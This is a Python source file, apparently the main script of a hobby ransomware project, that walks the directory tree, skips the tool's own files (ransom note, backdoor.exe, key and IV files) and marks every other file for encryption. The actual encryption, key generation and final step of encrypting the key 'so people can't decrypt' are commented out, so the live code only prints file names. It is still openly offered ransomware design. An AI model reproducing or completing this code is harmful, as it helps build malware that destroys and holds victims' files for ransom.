import os

# make needed files comments to not accidentally execute on host OS
# from decrypt import decrypt_file
# from encrypt import encrypt_file
# from generate import create_key

# create_key()

# while True:
#     encrypt_or_decrypt = input('encrypt or decrypt\n').lower()
#     if encrypt_or_decrypt!= 'encrypt' and encrypt_or_decrypt!= 'decrypt':
#         print("you didn\'t input 'encrypt' or 'decrypt'. Try again!\n")
#         continue
#     break

for root, dirs, files in os.walk(".", topdown=False):
    for name in files:
        # if encrypt_or_decrypt == 'encrypt':
        if name == 'encrypt.py' or name == 'generate.py' or name == 'ransomware.py' or name == 'ransom_note.py' or name == 'decrypt.py' or name == 'backdoor.exe' or name == 'key.txt'or name == 'iv.txt':
            continue # don't encrypt files needed for encryption/decryption
        try:
            # encrypt_file(os.path.join(root, name))
            print(f'encrypting file: {os.path.join(root, name)}')
        except PermissionError:
            print(f'need elevated permissions: {os.path.join(root, name)}')
            continue
        except:
            continue
        # elif encrypt_or_decrypt == 'decrypt':
        #     print(f'decrypting file: {os.path.join(root, name)}')
            # decrypt_file(os.path.join(root, name))
    # encrypt or decrypt file      
    # for name in dirs:
    #     pass
        # print(os.path.join(root, name))

# after encrypting everything else encrypt key so people can't decrypt

# encrypt_file('key.txt')